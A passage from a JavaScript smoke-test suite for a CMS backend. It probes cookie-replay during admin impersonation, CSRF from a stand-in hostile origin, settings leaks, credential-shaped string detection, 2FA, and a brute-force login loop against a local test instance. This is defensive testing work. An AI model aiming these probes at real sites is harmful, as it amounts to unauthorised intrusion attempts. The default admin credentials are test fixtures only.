          else fail('email rule weakened', `a domain with no dot was accepted: status=${typo.status}`);
        }

        if (victim) ok('a non-admin exists to act as');
        else fail('switch target', `could not create one: status=${mkTarget.status}`);
        if (victim) {
          const wentIn = await fetch(`${BASE}/api/users/switch`, {
            method: 'POST', headers: switchHdrs, body: JSON.stringify({ user_id: victim.id }),
          });
          const setCookies = wentIn.headers.getSetCookie?.() ?? [];
          const switchCookie = setCookies.find((c) => c.startsWith('astrobaas_switch='))?.split(';')[0];
          const asVictim = setCookies.find((c) => c.startsWith('astrobaas_session='))?.split(';')[0];
          if (wentIn.ok && switchCookie && asVictim) ok('an admin can act as a non-admin');
          else fail('switch start', `status=${wentIn.status} cookies=${setCookies.length}`);

          if (switchCookie) {
            // The switch cookie, presented alongside the ORIGINAL ADMIN's
            // session rather than the impersonated one. That is the shape of
            // "somebody else logged in on this browser": a valid session that
            // is not the one the token was issued for.
            const replay = await fetch(`${BASE}/api/users/switch`, {
              method: 'DELETE',
              headers: {
                Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}; ${switchCookie}`,
                'X-CSRF-Token': csrfToken,
              },
            });
            const replayCookies = (replay.headers.getSetCookie?.() ?? []).join(' ');
            if (replay.status === 403 && !/astrobaas_session=[^;]{20}/.test(replayCookies))
              ok('...and the way back is refused for a session it was not issued for');
            else fail('switch replay', `status=${replay.status} — a stale cookie handed out a session`);

            // ...and the refused token is cleared, so it cannot simply be
            // tried again on the next page load.
            if (/astrobaas_switch=;/.test(replayCookies) || /astrobaas_switch=[^;]*;\s*Max-Age=0/i.test(replayCookies))
              ok('...and the stale cookie is cleared on refusal');
            else fail('stale switch cookie kept', replayCookies.slice(0, 120));

            // The legitimate return: the impersonated session plus its own token.
            const properBack = await fetch(`${BASE}/api/users/switch`, {
              method: 'DELETE',
              headers: {
                Cookie: `${asVictim}; astrobaas_csrf=${csrfToken}; ${switchCookie}`,
                'X-CSRF-Token': csrfToken,
              },
            });
            if (properBack.ok) ok('...while the session it WAS issued for gets back');
            else fail('switch back', `status=${properBack.status}`);
          }
        }

        // Switching BACK without ever having switched is refused, and must not
        // hand out a session.
        const backWithout = await fetch(`${BASE}/api/users/switch`, { method: 'DELETE', headers: switchHdrs });
        const backCookies = backWithout.headers.get('set-cookie') ?? '';
        if (backWithout.status === 400 && !/astrobaas_session=[^;]+;/.test(backCookies))
          ok('switching back without a switch is refused and issues no session');
        else fail('switch back forged', `status=${backWithout.status} cookies=${backCookies.slice(0, 80)}`);
      }

      // EDITORIAL AI (C-163, C-134). The writing assistant spends the
      // operator's own credit per call, so unlike the public bubble it is
      // CLOSED. Both probes below send NO cookie — `ch` above is the ADMIN
      // session, which is what the chat assertions want and is exactly the
      // mistake the first draft of this block made: it "proved" an anonymous
      // caller was refused using an authenticated request.
      const anonJson = { 'Content-Type': 'application/json' };
      const assistAnon = await fetch(`${BASE}/api/assistant/assist`, {
        method: 'POST', headers: anonJson,
        body: JSON.stringify({ task: 'improve', text: 'hello' }),
      });
      if (assistAnon.status === 401 || assistAnon.status === 403)
        ok('the writing assistant refuses an anonymous caller');
      else fail('assist endpoint open', `status=${assistAnon.status} (expected 401/403)`);

      const assistAnonGet = await fetch(`${BASE}/api/assistant/assist`);
      if (assistAnonGet.status === 401 || assistAnonGet.status === 403)
        ok('...and its task catalogue is closed too');
      else fail('assist catalogue open', `status=${assistAnonGet.status} (expected 401/403)`);

      // A cookie-less POST from an ALLOW-LISTED origin gets past CSRF for the
      // chat route. The assistant's editorial sibling must still refuse it —
      // the CSRF exemption is about ambient authority, not about authorisation,
      // and an embeddable widget has no business spending editorial tokens.
      const assistWidget = await fetch(`${BASE}/api/assistant/assist`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Origin: 'https://frontend.example.com' },
        body: JSON.stringify({ task: 'improve', text: 'hello' }),
      });
      if (assistWidget.status === 401 || assistWidget.status === 403)
        ok('...and an embedding host cannot reach it either');
      else fail('assist widget reachable', `status=${assistWidget.status} (expected 401/403)`);

      // Signed in, no provider configured: 404, matching the chat route — an
      // assistant that is off looks absent rather than like something to keep
      // probing. This also proves the endpoint EXISTS and routes.
      const assistAuthed = await fetch(`${BASE}/api/assistant/assist`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ task: 'improve', text: 'hello' }),
      });
      if (assistAuthed.status === 404) ok('an admin reaches it, and it 404s while unconfigured');
      else fail('assist authed', `status=${assistAuthed.status} (expected 404)`);

      // -- embeddable widget + its cross-origin CSRF exemption --
      // The exemption is safe ONLY because a cookie-less request carries no
      // ambient authority. Each assertion below pins one half of that.
      const ALLOWED = 'https://frontend.example.com';   // in CORS_ORIGINS
      const HOSTILE = 'https://evil.example.com';
      const chatUrl = `${BASE}/api/assistant/chat`;
      const chatBody = JSON.stringify({ message: 'hello' });

      // NOTE: the OPTIONS preflight is asserted in the E2E suite, not here —
      // under `astro dev` Vite answers OPTIONS before our middleware, so a
      // preflight assertion would test Vite. What our middleware controls in
      // dev is the ACTUAL response, so that is what is checked here.

      // Cookie-less + allow-listed + NO csrf token -> must get past CSRF.
      // (404 because no assistant is configured in the smoke env — the point is
      // that it is NOT 403.)
      const embedded = await fetch(chatUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Origin: ALLOWED },
        body: chatBody,
      });
      if (embedded.status !== 403) ok('a cookie-less POST from an allow-listed origin skips CSRF');
      else fail('widget CSRF exemption', `status=403 — embedded widgets cannot work`);
      if (embedded.headers.get('access-control-allow-origin') === ALLOWED) ok('the chat response carries CORS for the embedding host');
      else fail('chat CORS', embedded.headers.get('access-control-allow-origin') || '(none)');

      // A non-allow-listed origin gets no exemption.
      const hostile = await fetch(chatUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Origin: HOSTILE },
        body: chatBody,
      });
      if (hostile.status === 403) ok('a NON-allow-listed origin still faces CSRF');
      else fail('origin gate', `status=${hostile.status} (expected 403)`);

      // No Origin at all: a same-origin form post can forge that shape, so it
      // keeps the CSRF requirement.
      const noOrigin = await fetch(chatUrl, {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: chatBody,
      });
      if (noOrigin.status === 403) ok('a POST with no Origin header still faces CSRF');
      else fail('no-origin gate', `status=${noOrigin.status} (expected 403)`);

      // THE load-bearing one: a request carrying a SESSION cookie has ambient
      // authority, so the exemption must not apply however good its Origin is.
      // Without this, any page could drive this endpoint using an admin's session.
      const withSession = await fetch(chatUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Origin: ALLOWED, Cookie: sessionCookie },
        body: chatBody,
      });
      if (withSession.status === 403) ok('a session-carrying POST still requires CSRF (no session riding)');
      else fail('SESSION RIDING', `status=${withSession.status} — CSRF was skipped for a cookie-bearing request`);

      // The embeddable widget itself.
      const widget = await fetch(`${BASE}/assistant-widget.js`, { headers: { Origin: ALLOWED } });
      const widgetJs = await widget.text();
      if (widget.status === 200 && /javascript/.test(widget.headers.get('content-type') || '')) {
        ok('the embeddable widget is served as JavaScript');
      } else fail('widget', `status=${widget.status} type=${widget.headers.get('content-type')}`);
      if (widget.headers.get('access-control-allow-origin') === ALLOWED) ok('the widget carries CORS for an allow-listed host');
      else fail('widget CORS', widget.headers.get('access-control-allow-origin'));
      if (/credentials:\s*'omit'/.test(widgetJs)) ok('the widget posts WITHOUT credentials (what makes the exemption safe)');
      else fail('widget credentials', 'widget does not send credentials:omit');
      if (!/sk-|api[_-]?key|whsec/i.test(widgetJs)) ok('the embeddable widget carries no credential-shaped strings');
      else fail('widget LEAK', widgetJs.slice(0, 160));

      // The served widget + consent scripts must exist and be inert.
      for (const [path, label] of [['/consent.js', 'consent'], ['/assistant.js', 'assistant']]) {
        const res = await fetch(`${BASE}${path}`);
        const body = await res.text();
        if (res.status === 200 && /javascript/.test(res.headers.get('content-type') || '')) {
          ok(`${label}.js is served as JavaScript`);
        } else fail(`${label}.js`, `status=${res.status} type=${res.headers.get('content-type')}`);
        if (!/sk-|api[_-]?key|whsec/i.test(body)) ok(`${label}.js contains no credential-shaped strings`);
        else fail(`${label}.js LEAK`, body.slice(0, 160));
      }
      // The assistant widget must be inert with nothing configured.
      const assistantJs = await (await fetch(`${BASE}/assistant.js`)).text();
      if (/"enabled":false/.test(assistantJs)) ok('the assistant widget is inert until configured');
      else fail('assistant widget', assistantJs.slice(0, 160));

      // A-4: an unconfigured assistant costs NO request.
      //
      // Being inert was never the whole claim. The homepage says the client JS
      // is a consent manager "and the AI assistant if you enable it", and
      // BaseLayout used to emit <script src="/assistant.js"> on every public
      // page regardless — so every install that never touched the feature still
      // downloaded it. The feature was conditional; the download was not.
      //
      // Asserted on rendered HTML rather than on the layout source, because the
      // claim is about what a visitor receives.
      const publicHtml = await (await fetch(`${BASE}/`)).text();
      if (!/src="\/assistant\.js"/.test(publicHtml)) {
        ok('an unconfigured assistant links no script on public pages (A-4)');
      } else {
        fail('A-4 assistant script', 'BaseLayout linked /assistant.js with no assistant configured');
      }
      // The paired positive, so the check above cannot pass by the whole <head>
      // having quietly disappeared.
      if (/src="\/consent\.js"/.test(publicHtml)) ok('consent.js is still linked unconditionally');
      else fail('consent script', 'consent.js missing from public HTML');
    }

    // --- Google Consent Mode v2, in the file that is actually served ---
    //
    // The mapping is unit-tested; what can only be checked here is that the
    // served script carries it at all, in the right order, and without having
    // quietly started loading Google before anyone consented.
    {
      const js = await (await fetch(`${BASE}/consent.js`)).text();

      if (/gtag\('consent', mode, state\)/.test(js) || /gtag\("consent", mode, state\)/.test(js)) {
        ok('consent mode: the served script pushes consent signals');
      } else fail('consent mode missing', 'no consent push in /consent.js');

      if (/pushConsentMode\('default', null\)/.test(js)) {
        ok('consent mode: the DEFAULT is pushed with no decision — denied, whatever is stored');
      } else fail('consent mode default', 'no unconditional default push');

      // Order matters: a default pushed after an update describes the wrong
      // baseline, and a tag arriving late reads them in queue order.
      const defaultAt = js.indexOf("pushConsentMode('default', null)");
      const updateAt = js.indexOf("if (stored) pushConsentMode('update', stored)");
      if (defaultAt > 0 && updateAt > defaultAt) {
        ok('consent mode: the default is queued BEFORE the stored decision');
      } else fail('consent mode order', `default@${defaultAt} update@${updateAt}`);

      if (/ad_user_data/.test(js) && /ad_personalization/.test(js)) {
        ok('consent mode: the v2 ad signals reach the browser');
      } else fail('consent mode v2 signals', 'ad_user_data/ad_personalization not in the served file');

      if (/wait_for_update/.test(js)) ok('consent mode: a late tag is told to wait rather than send denials');
      else fail('consent mode wait_for_update', 'not present');

      // The promise the banner makes, still kept: no third-party request until
      // somebody says yes. Consent Mode did NOT become a reason to load gtag
      // unconditionally, which is what Google's own guidance would have.
      //
      // Stated as the invariant rather than as two alternatives: every vendor
      // load goes through loadConsented, and loadConsented skips a provider
      // whose category was not granted. An `||` here would have made this
      // unfalsifiable, which is worse than not checking at all.
      if (/if \(!granted\(p\.category\)\) continue;/.test(js)) {
        ok('consent mode: the vendor loader still refuses an un-consented category');
      } else fail('consent gate gone', 'loadConsented no longer checks granted()');

      // ...and no vendor URL is fetched outside that loader table.
      const outsideLoaders = js.replace(/var LOADERS = \{[\s\S]*?\n  \};/, '');
      if (!/googletagmanager\.com|connect\.facebook\.net|analytics\.tiktok\.com/.test(outsideLoaders)) {
        ok('consent mode: no third-party URL is reachable outside the consent-gated loaders');
      } else fail('vendor url outside loaders', outsideLoaders.match(/https:\/\/[a-z.]+/)?.[0] ?? '?');
    }

    // --- settings are NOT an anonymous dump of the whole table ---
    // Regression guard for a real leak: `/api/settings/get` is public (a
    // decoupled storefront reads the site title from it), but settings are
    // schemaless, so returning everything published whatever an operator or
    // plugin stored — SMTP passwords, provider secrets — with no warning.
    {
      // Named "internal", not "secret": this key stands for "not in the public
      // allow-list", and credential-shaped NAMES are now withheld from staff
      // too. `zz_smoke_secret_*` would be caught by that rule — correctly, but
      // it would be testing the wrong thing.
      const secretKey = `zz_smoke_internal_${Date.now()}`;
      await fetch(`${BASE}/api/settings/update`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({ [secretKey]: 'super-secret-value', public_smoke_ok: 'visible' }),
      });

      const anon = (await (await fetch(`${BASE}/api/settings/get`)).json().catch(() => null))?.data ?? {};
      if (!(secretKey in anon)) ok('anonymous settings read hides a non-public key');
      else fail('SETTINGS LEAK', `${secretKey} readable without auth`);
      if (!JSON.stringify(anon).includes('super-secret-value')) ok('the secret value appears nowhere in the public payload');
      else fail('SETTINGS LEAK', 'secret value present in anonymous response');
      if (anon.site_title !== undefined) ok('anonymous settings read still exposes the public keys');
      else fail('settings public keys', JSON.stringify(anon).slice(0, 120));
      if (anon.public_smoke_ok === 'visible') ok('a public_-prefixed key is deliberately visible');
      else fail('public_ prefix', JSON.stringify(anon).slice(0, 120));

      const staff = (await (await fetch(`${BASE}/api/settings/get`, { headers: { Cookie: sessionCookie } })).json().catch(() => null))?.data ?? {};
      // `zz_smoke_secret_*` is not credential-shaped, so staff still read its
      // VALUE — operational settings are exactly what a staff read is for.
      if (staff[secretKey] === 'super-secret-value') ok('staff read non-credential settings in full');
      else fail('staff settings read', JSON.stringify(Object.keys(staff)).slice(0, 140));

      // Credential-shaped keys are different, and this assertion replaced one
      // that required the opposite. `if (isStaff) return settings` meant an
      // EDITOR — a role that cannot reach most of the admin — read
      // smtp_password and stripe_secret_key from a route in the public
      // allow-list. A secret that is never returned cannot be leaked by the
      // next routing mistake, so the deny rule now applies at every role.
      await fetch(`${BASE}/api/settings/update`, {
        method: 'POST',
        headers: { Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`, 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
        body: JSON.stringify({ smtp_password: 'smoke-smtp-secret', stripe_publishable_key: 'pk_smoke_visible' }),
      });
      const staff2 = (await (await fetch(`${BASE}/api/settings/get`, { headers: { Cookie: sessionCookie } })).json().catch(() => null))?.data ?? {};
      if (staff2.smtp_password === undefined && !JSON.stringify(staff2).includes('smoke-smtp-secret')) {
        ok('a credential-shaped key is withheld even from staff');
      } else fail('staff secret leak', JSON.stringify(Object.keys(staff2)).slice(0, 160));
      if (staff2.smtp_password__is_set === true) ok('...and reported as set, so the admin can manage it');
      else fail('is_set flag', JSON.stringify(Object.keys(staff2)).slice(0, 160));
      // A publishable key is MEANT to be public; withholding it breaks a storefront.
      if (staff2.stripe_publishable_key === 'pk_smoke_visible') ok('a publishable key is not mistaken for a secret');
      else fail('publishable key withheld', JSON.stringify(staff2.stripe_publishable_key));
    }

    // --- orders + customers are staff-only (PII) ---
    for (const p of ['/api/orders', '/api/customers']) {
      const anon = await fetch(`${BASE}${p}`);
      if (anon.status === 401 || anon.status === 403) ok(`${p} is staff-only`);
      else fail(`${p} authz`, `status=${anon.status}`);
    }

    // --- bulk import ---
    {
      const imp = await fetch(`${BASE}/api/commerce/import`, {
        method: 'POST', headers: ch,
        body: JSON.stringify({
          categories: [{ slug: 'smoke-cat', name: 'Smoke Cat' }],
          products: [
            { slug: 'imp-1', name: 'Imported 1', price_cents: 2000, regular_price_cents: 2500, sale_price_cents: 2000, categories: ['smoke-cat'] },
            { slug: 'imp-bad', name: 'Bad', price_cents: 100, categories: ['does-not-exist'] },
          ],
        }),
      });
      const ij = await imp.json().catch(() => null);
      if (imp.status === 200 && ij?.data?.products?.created === 1 && ij.data.skipped === 1) {
        ok('bulk import creates valid rows and skips bad ones');
      } else {
        fail('catalogue import', JSON.stringify(ij?.data)?.slice(0, 160));
      }
      const imported = await (await fetch(`${BASE}/api/products/imp-1`)).json().catch(() => null);
      if (imported?.data?.on_sale === true && imported.data.price_cents === 2000) ok('imported sale pricing is applied');
      else fail('import sale price', JSON.stringify(imported?.data)?.slice(0, 120));

      const anonImp = await fetch(`${BASE}/api/commerce/import`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ products: [] }),
      });
      if (anonImp.status === 401 || anonImp.status === 403) ok('bulk import is staff-only');
      else fail('import authz', `status=${anonImp.status}`);
    }
  }

  // 9. Sitemap is XML
  {
    const r = await fetch(`${BASE}/sitemap.xml`);
    const txt = await r.text();
    if (r.status === 200 && txt.startsWith('<?xml')) ok('GET /sitemap.xml is XML');
    else fail('GET /sitemap.xml', `status=${r.status}`);
  }

  // 9b. Agent-readable contract: /llms.txt + /openapi.json (public, no auth)
  {
    const r = await fetch(`${BASE}/llms.txt`);
    const txt = await r.text();
    const ct = r.headers.get('content-type') || '';
    if (r.status === 200 && ct.includes('text/plain') && /AstroBaaS/i.test(txt) && txt.includes('/api/'))
      ok('GET /llms.txt is a plain-text agent brief');
    else fail('GET /llms.txt', `status=${r.status} ct=${ct}`);
  }
  {
    const r = await fetch(`${BASE}/openapi.json`);
    const ct = r.headers.get('content-type') || '';
    const spec = await r.json().catch(() => null);
    if (
      r.status === 200 &&
      ct.includes('application/json') &&
      spec?.openapi?.startsWith('3.') &&
      spec?.paths?.['/api/posts'] &&
      spec?.components?.securitySchemes?.bearerApiKey
    )
      ok('GET /openapi.json is a valid OpenAPI 3 spec with bearerApiKey');
    else fail('GET /openapi.json', `status=${r.status} ct=${ct} openapi=${spec?.openapi}`);
  }

  // 10. Every remaining admin screen renders for an admin (catches stale/broken pages).
  if (sessionCookie) {
    const adminScreens = [
      '/admin',
      '/admin/posts',
      '/admin/posts/new',
      '/admin/categories',
      '/admin/media',
      '/admin/users',
      '/admin/profile',
      '/admin/settings',
      '/admin/tools',
      '/admin/api-keys',
      '/admin/webhooks',
      '/admin/audit',
    ];
    for (const pth of adminScreens) {
      const r = await fetch(`${BASE}${pth}`, { headers: { Cookie: sessionCookie } });
      if (r.status === 200) ok(`GET ${pth} (admin) → 200`);
      else fail(`GET ${pth}`, `status=${r.status}`);
    }

    // The EDIT screen, which this walk never reached — the list and the create
    // page were both here and the one in between was not. An audit found its
    // frontmatter calling two functions whose imports sat inside the <script>
    // block: a hard 500 on every post, invisible to `astro check` (the script
    // carries `// @ts-nocheck`) and to every test in this file.
    //
    // Fetched for a REAL post id, and asserted on the form rather than only on
    // the status, because an error page can also answer 200 in some setups.
    {
      const listed = await (await fetch(`${BASE}/api/posts?limit=1`, {
        headers: { Cookie: sessionCookie },
      })).json().catch(() => null);
      const id = listed?.data?.[0]?.id;
      if (id) {
        const r = await fetch(`${BASE}/admin/posts/${id}/edit`, { headers: { Cookie: sessionCookie } });
        const html = await r.text();
        if (r.status === 200 && html.includes('id="post-form"')) ok('GET /admin/posts/:id/edit (admin) → 200 with the edit form');
        else fail('GET /admin/posts/:id/edit', `status=${r.status} len=${html.length}`);
      } else {
        fail('edit screen', 'no post to open');
      }
    }
  }

  // 11. Remaining public endpoints.
  for (const [pth, test] of [
    ['/rss.xml', (t) => t.includes('<rss')],
    ['/robots.txt', (t) => /User-agent/i.test(t)],
    ['/healthz', (t) => t.includes('"ok"')],
  ]) {
    const r = await fetch(`${BASE}${pth}`);
    const t = await r.text();
    if (r.status === 200 && test(t)) ok(`GET ${pth} → 200`);
    else fail(`GET ${pth}`, `status=${r.status}`);
  }

  // 11a2. Two-factor (TOTP): full enroll → login-requires-code → backup → disable.
  if (sessionCookie && csrfToken) {
    const { totp } = await loadTotp();
    const authed = (pth, body) =>
      fetch(`${BASE}${pth}`, {
        method: 'POST',
        headers: {
          Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken,
        },
        body: body === undefined ? undefined : JSON.stringify(body),
      });
    const jsonLogin = (payload, cookie) =>
      fetch(`${BASE}/api/auth/login`, {
        method: 'POST',
        headers: cookie ? { 'Content-Type': 'application/json', Cookie: cookie } : { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

    // 1. Setup → secret + otpauth URI.
    let secret = '';
    {
      const r = await authed('/api/2fa/setup');
      const j = await r.json().catch(() => null);
      if (r.status === 200 && j?.data?.secret && /^otpauth:\/\/totp\//.test(j.data?.otpauth_uri || '')) {
        secret = j.data.secret;
        ok('2FA setup → secret + otpauth URI');
      } else fail('2FA setup', `status=${r.status} ${JSON.stringify(j)}`);
    }

    // 2. Enable rejects a wrong code (not a login → no throttle cost).
    {
      const r = await authed('/api/2fa/enable', { code: '000000' });
      if (r.status === 400) ok('2FA enable rejects a wrong code');
      else fail('2FA enable wrong code', `expected 400, got ${r.status}`);
    }

    // 3. Enable with the correct code → on, returns 10 one-time backup codes.
    let backupCodes = [];
    if (secret) {
      const r = await authed('/api/2fa/enable', { code: totp(secret) });
      const j = await r.json().catch(() => null);
      if (r.status === 200 && j?.data?.enabled === true && Array.isArray(j.data?.backup_codes) && j.data.backup_codes.length === 10) {
        backupCodes = j.data.backup_codes;
        ok('2FA enable → confirmed + 10 backup codes');
      } else fail('2FA enable', `status=${r.status} ${JSON.stringify(j)}`);
    }

    // 4. /api/auth/me must expose two_factor_enabled but never the secret/hashes.
    {
      const r = await fetch(`${BASE}/api/auth/me`, { headers: { Cookie: sessionCookie } });
      const t = await r.text();
      if (r.status === 200 && /"two_factor_enabled":true/.test(t) && !/"secret"|backup_codes|"two_factor":/.test(t))
        ok('/api/auth/me → two_factor_enabled, no secret leak');
      else fail('/api/auth/me 2FA leak check', t.slice(0, 240));
    }

    // 5. Fresh login WITHOUT a code → 401 TOTP_REQUIRED + short-lived pending cookie.
    let pendingCookie = '';
    if (secret) {
      const r = await jsonLogin({ email: 'admin@local', password: 'admin' });
      const j = await r.json().catch(() => null);
      const setC = r.headers.getSetCookie?.() ?? [r.headers.get('set-cookie') ?? ''];
      for (const c of setC) {
        const m = c.match(/(astrobaas_2fa_pending)=([^;]+)/);
        if (m) pendingCookie = `astrobaas_2fa_pending=${m[2]}`;
      }
      if (r.status === 401 && j?.error?.code === 'TOTP_REQUIRED' && pendingCookie)
        ok('login without code → 401 TOTP_REQUIRED + pending cookie');
      else fail('login TOTP_REQUIRED', `status=${r.status} code=${j?.error?.code} pending=${!!pendingCookie}`);
    }

    // 6. Step 2: pending cookie + code only (no password re-entry) → success.
    if (pendingCookie && secret) {
      const r = await jsonLogin({ code: totp(secret) }, pendingCookie);
      if (r.status === 200) ok('2FA step-2 (pending cookie + code) logs in');
      else fail('2FA step-2', `status=${r.status}`);
    }

    // 7. A backup code logs in once (inline), then is consumed (reuse fails).
    if (backupCodes.length) {
      const code = backupCodes[0];
      const first = await jsonLogin({ email: 'admin@local', password: 'admin', code });
      const second = await jsonLogin({ email: 'admin@local', password: 'admin', code });
      if (first.status === 200 && second.status === 401) ok('backup code works once then is consumed');
      else fail('backup code single-use', `first=${first.status} second=${second.status}`);
    }

    // 8. Disable needs a valid code: wrong refused, correct turns it off.
    if (secret) {
      const wrong = await authed('/api/2fa/disable', { code: '000000' });
      const right = await authed('/api/2fa/disable', { code: totp(secret) });
      if (wrong.status === 400 && right.status === 200) ok('2FA disable requires a valid code');
      else fail('2FA disable', `wrong=${wrong.status} right=${right.status}`);
    }

    // 9. With 2FA off, a plain login works again (no code needed).
    {
      const r = await jsonLogin({ email: 'admin@local', password: 'admin' });
      if (r.status === 200) ok('after disable, plain login works again');
      else fail('login after 2FA disable', `status=${r.status}`);
    }
  }

  // 11b. Observability: /readyz (readiness) + /metrics (Prometheus, enabled here).
  {
    const r = await fetch(`${BASE}/readyz`);
    const j = await r.json().catch(() => null);
    if (r.status === 200 && j?.ready === true) ok('GET /readyz → 200 ready:true');
    else fail('GET /readyz', `status=${r.status} ${JSON.stringify(j)}`);

    // Migrations ran at boot on THIS driver: the DB reports a schema version at
    // least the build's expected version (proves the runner works per-backend).
    if (
      typeof j?.schema_version === 'number' &&
      typeof j?.expected_schema_version === 'number' &&
      j.schema_version >= j.expected_schema_version &&
      j.expected_schema_version >= 1
    )
      ok(`schema migrated to v${j.schema_version} at boot`);
    else fail('schema version at boot', JSON.stringify(j));

    const m = await fetch(`${BASE}/metrics`);
    const mt = await m.text();
    if (m.status === 200 && /astrobaas_requests_total \d+/.test(mt) && mt.includes('astrobaas_uptime_seconds'))
      ok('GET /metrics → Prometheus counters (METRICS_ENABLED)');
    else fail('GET /metrics', `status=${m.status}`);

    // The latency histogram is fed by the REAL middleware wrapper: by now the
    // suite has made hundreds of requests, so its count cannot be zero, and
    // +Inf must equal _count. The in-flight gauge includes this very request
    // (it is rendered while the wrapper still counts it), so it is at least 1
    // — a wrapper that never incremented would publish 0.
    const count = Number(mt.match(/^astrobaas_request_duration_seconds_count (\d+)$/m)?.[1]);
    const inf = Number(mt.match(/^astrobaas_request_duration_seconds_bucket\{le="\+Inf"\} (\d+)$/m)?.[1]);
    if (count > 0 && inf === count) ok('/metrics: the latency histogram is fed by real requests');
    else fail('/metrics latency histogram', `count=${count} +Inf=${inf}`);
    if (/^astrobaas_rate_limited_total \d+$/m.test(mt)) ok('/metrics: 429s have their own counter');
    else fail('/metrics 429 counter', 'astrobaas_rate_limited_total missing');
    const inflight = Number(mt.match(/^astrobaas_inflight_requests (\d+)$/m)?.[1]);
    if (inflight >= 1) ok('/metrics: the middleware counts in-flight requests (this one included)');
    else fail('/metrics in-flight gauge', `astrobaas_inflight_requests=${inflight}`);
    if (/^astrobaas_draining 0$/m.test(mt)) ok('/metrics: a running server is not draining');
    else fail('/metrics draining gauge', 'expected astrobaas_draining 0');

    // Liveness no longer reads the content library, nor publishes its size.
    const hz = await fetch(`${BASE}/healthz`);
    const hj = await hz.json().catch(() => null);
    if (hz.status === 200 && hj?.ok === true && hj?.posts === null) ok('GET /healthz → 200, no post count published');
    else fail('GET /healthz shape', `status=${hz.status} ${JSON.stringify(hj)}`);
  }

  // 12. Unknown route 404s (Astro custom 404 page).
  {
    const r = await fetch(`${BASE}/this-page-does-not-exist`);
    if (r.status === 404) ok('GET /<unknown> → 404');
    else fail('GET /<unknown>', `expected 404, got ${r.status}`);
  }

  // 12b. Session revocation: changing the user's own password bumps
  // session_version, invalidating the OLD session cookie while the response
  // re-issues a fresh one. (Safe: smoke uses an isolated temp DB.)
  if (sessionCookie && csrfToken) {
    // Resolve the admin's own id from /api/auth/me.
    const me = await (await fetch(`${BASE}/api/auth/me`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
    const myId = me?.data?.id;
    const r = await fetch(`${BASE}/api/users/update`, {
      method: 'POST',
      headers: {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      },
      body: JSON.stringify({ id: myId, password: 'a-new-strong-password' }),
    });
    const reissued = (r.headers.getSetCookie?.() ?? []).find((c) => c.startsWith('astrobaas_session='));
    const newCookie = reissued ? 'astrobaas_session=' + reissued.match(/astrobaas_session=([^;]+)/)[1] : '';

    // Old cookie must now be rejected on an authenticated endpoint.
    const oldCheck = await fetch(`${BASE}/api/auth/me`, { headers: { Cookie: sessionCookie } });
    if (oldCheck.status === 401) ok('session revoked: old cookie rejected after password change');
    else fail('session revocation', `old cookie still valid (status ${oldCheck.status})`);

    // …and must be bounced off admin PAGES too (the /admin gate uses the
    // DB-revalidated user, not just the crypto-valid token).
    const oldPage = await fetch(`${BASE}/admin`, { headers: { Cookie: sessionCookie }, redirect: 'manual' });
    if (oldPage.status >= 300 && oldPage.status < 400) ok('session revoked: old cookie bounced from /admin pages');
    else fail('revoked-cookie admin page', `expected redirect, got ${oldPage.status}`);

    // The re-issued cookie must still work (acting session not logged out).
    if (newCookie) {
      const newCheck = await fetch(`${BASE}/api/auth/me`, { headers: { Cookie: newCookie } });
      if (newCheck.status === 200) ok('session revoked: re-issued cookie still valid');
      else fail('session re-issue', `new cookie invalid (status ${newCheck.status})`);
      sessionCookie = newCookie; // keep using the valid one for later steps
    } else {
      fail('session re-issue', 'no re-issued session cookie on self password change');
    }
  }

  // 13. Login brute-force throttle fires after the per-IP+email limit (10/15min).
  // Uses a unique email so it can't affect the real admin login above.
  {
    const victim = 'throttle-probe@example.com';
    let got429 = false;
    for (let i = 0; i < 14; i++) {
      const r = await fetch(`${BASE}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: victim, password: 'wrong-password' }),
      });
      if (r.status === 429) { got429 = true; break; }
    }
    if (got429) ok('login throttle returns 429 after repeated attempts');
    else fail('login throttle', 'never returned 429 across 14 attempts');
  }

  // Sign-in helpers for 13b–13d. Each block uses its own fresh account, so the
  // per-account counters it trips cannot leak into anything else.
  const jsonLogin = (body, cookie) => fetch(`${BASE}/api/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...(cookie ? { Cookie: cookie } : {}) },
    body: JSON.stringify(body),
  });
  const makeUser = async (email, password) => {
    if (!sessionCookie || !csrfToken) return false;
    const r = await fetch(`${BASE}/api/users/create`, {
      method: 'POST',
      headers: { Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`, 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
      body: JSON.stringify({ name: email.split('@')[0], email, role: 'author', password }),
    });
    return r.status === 201;
  };

  // 13b. S3.9 — an account being guessed at from anywhere requires
  // proof-of-work; its owner still signs in.
  {
    const OWNER = 'pow-owner@example.com';
    const PW = 'Owner#Pass1';
    await clearOfLoginWindowBoundary();
    if (await makeUser(OWNER, PW)) {
      const wrong = [];
      for (let i = 0; i < 5; i += 1) wrong.push((await jsonLogin({ email: OWNER, password: `wrong-${i}` })).status);
      if (wrong.every((s) => s === 401)) ok('S3.9: five wrong passwords are ordinary 401s');
      else fail('S3.9 wrong passwords', JSON.stringify(wrong));

      const noProof = await jsonLogin({ email: OWNER, password: PW });
      const np = await noProof.json().catch(() => null);
      const challenge = np?.error?.details?.challenge;
      if (noProof.status === 403 && np?.error?.code === 'POW_REQUIRED' && challenge?.token && challenge?.bits >= 8) {
